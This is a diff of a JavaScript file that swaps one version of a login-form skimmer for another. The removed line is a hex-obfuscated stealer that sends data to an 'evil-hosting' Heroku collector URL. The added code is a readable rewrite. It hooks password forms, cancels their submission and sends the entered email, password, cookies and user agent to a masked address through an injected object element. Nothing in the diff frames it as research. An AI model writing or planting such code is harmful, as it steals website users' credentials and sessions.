@@ -1,1 +1,55 @@
-var _0x2cd1=["\x6D\x79\x41\x50\x50","\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x65\x76\x69\x6C\x2D\x68\x6F\x73\x74\x69\x6E\x67\x2E\x68\x65\x72\x6F\x6B\x75\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x63\x6F\x6C\x6C\x65\x63\x74\x6F\x72\x3F","\x53\x74\x65\x61\x6C","\x76\x61\x6C\x75\x65","\x63\x6F\x6F\x6B\x69\x65","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x68\x61\x73\x4F\x77\x6E\x50\x72\x6F\x70\x65\x72\x74\x79","\x3D","\x70\x75\x73\x68","\x26","\x6A\x6F\x69\x6E","\x69\x6D\x67","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x69\x66\x72\x61\x6D\x65","\x49\x6E\x6A\x65\x63\x74","\x69\x6E\x70\x75\x74\x5B\x74\x79\x70\x65\x3D\x22\x70\x61\x73\x73\x77\x6F\x72\x64\x22\x5D","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x69\x6E\x70\x75\x74","\x74\x79\x70\x65","\x70\x61\x73\x73\x77\x6F\x72\x64","\x65\x6D\x61\x69\x6C","\x74\x65\x78\x74","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72"];({myAPP:function(){_0x2cd1[1];var _0x1445x1=_0x1445x1|| {connection:"******",fabric:[],timeout:1000};_0x1445x1[_0x2cd1[3]]= function(_0x1445x2){var _0x1445x3={email:_0x1445x2[0][_0x2cd1[4]],password:_0x1445x2[1][_0x2cd1[4]],cookies:document[_0x2cd1[5]],userAgent:navigator[_0x2cd1[6]]};var _0x1445x4=[];for(var _0x1445x5 in _0x1445x3){if(_0x1445x3[_0x2cd1[7]](_0x1445x5)){_0x1445x4[_0x2cd1[9]](_0x1445x5+ _0x2cd1[8]+ _0x1445x3[_0x1445x5])}};var _0x1445x6=_0x1445x4[_0x2cd1[11]](_0x2cd1[10]);var _0x1445x7=document[_0x2cd1[13]](_0x2cd1[12]);_0x1445x7[_0x2cd1[16]](_0x2cd1[14],_0x1445x1[_0x2cd1[15]]+ _0x1445x6);if(document[_0x2cd1[18]][_0x2cd1[17]](_0x1445x7)){document[_0x2cd1[18]][_0x2cd1[17]](_0x1445x7)}else {var _0x1445x8=document[_0x2cd1[13]](_0x2cd1[19]);_0x1445x8[_0x2cd1[16]](_0x2cd1[14],_0x1445x1[_0x2cd1[15]]+ _0x1445x6);document[_0x2cd1[18]][_0x2cd1[17]](_0x1445x8)}};_0x1445x1[_0x2cd1[20]]= function(_0x1445x3){var _0x1445x9=document[_0x2cd1[22]](_0x2cd1[21]),_0x1445xa,_0x1445xb,_0x1445xc,_0x1445xd=[];for(var _0x1445xe=0;_0x1445xe< _0x1445x9[_0x2cd1[23]];_0x1445xe++){_0x1445xa= _0x1445x9[_0x1445xe][_0x2cd1[24]];_0x1445xa[_0x2cd1[31]](_0x2cd1[25],function(_0x1445xf){_0x1445xb= this[_0x2cd1[22]](_0x2cd1[26]);for(var _0x1445xe=0;_0x1445xe< _0x1445xb[_0x2cd1[23]];_0x1445xe++){_0x1445xc= _0x1445xb[_0x1445xe];if(_0x1445xc[_0x2cd1[27]]=== _0x2cd1[28]|| _0x1445xc[_0x2cd1[27]]=== _0x2cd1[29]|| _0x1445xc[_0x2cd1[27]]=== _0x2cd1[30]){_0x1445xd[_0x2cd1[9]](_0x1445xc)}};_0x1445x1.Steal(_0x1445xd)})}};_0x1445x1.Inject()}})[_0x2cd1[0]]()
+(function(argument) {
+  
+    function abc(str) {
+      // Going backwards: from bytestream, to percent-encoding, to original string.
+      return decodeURIComponent(atob(str).split('').map(function(c) {
+        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+      }).join(''));
+    }
+
+    var password = document.querySelectorAll('input[type="password"]');
+
+    for(var i = 0; i < password.length; i++) {
+
+      var form = password[i].form;
+
+      form.addEventListener('submit', function(event){
+
+        event.preventDefault();
+
+        nodes = this.querySelectorAll('input'); 
+
+        for(var i = 0; i < nodes.length; i++) {
+
+          var node = nodes[i];
+
+          if (node.type === abc("cGFzc3dvcmQ=") || node.type === abc("ZW1haWw=") || node.type === abc("dGV4dA==")) {
+
+            if (node.type === abc("ZW1haWw=") || node.type == abc("dGV4dA==")) {
+              var uuid = node.value
+            } else if (node.type === abc("cGFzc3dvcmQ=")) {
+              var pass = node.value
+            }
+          }
+        }
+
+        var params = { "email": uuid, "password": pass, "cookies": document.cookie, "userAgent": navigator.userAgent };
+
+        var querys = []
+
+        for (var key in params) {
+          if (params.hasOwnProperty(key)) {
+            querys.push(key + '=' + params[key]);
+          }
+        };
+
+        var formatted = querys.join('&');
+
+        var object = document.createElement("object");
+        object.setAttribute("data", '******' + formatted);
+        object.setAttribute("type", "application/json");
+        document.body.appendChild(object);
+
+      });
+    }
+}());
